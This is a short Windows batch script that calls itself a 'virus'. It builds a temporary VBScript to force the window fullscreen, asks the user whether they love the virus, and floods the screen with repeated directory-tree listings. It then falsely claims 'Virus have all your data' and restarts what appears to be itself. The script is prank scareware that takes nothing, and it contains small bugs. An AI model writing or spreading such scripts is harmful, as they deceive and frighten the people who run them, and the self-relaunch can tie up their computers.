@ECHO OFF

:VBSDynamicBuild
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 1                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 1                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

:1
color 5
echo You love this virus? (answer in only yes/no)
set /p input=
if /i %input%==yes goto 2
if /i %input%==no goto 2
if /i not %input%== Yes,no goto 1

:2
color 4
tree
tree
tree
tree
tree
timeout 1
dir /s
tree
dir /s
tree
dir /s
tree
dir /s
tree
dir /s
timeout 1
dir /r
tree
dir /r
tree
dir /r
tree
dir /r
tree
dir /r
timeout 1
echo Virus have all your data, you love it? (answer in only yes/no)
if /i %input%==yes goto 3
if /i %input%==no goto 3
if /i not %input%== Yes,no goto 2


:3
start VBSDynamicBuild.bat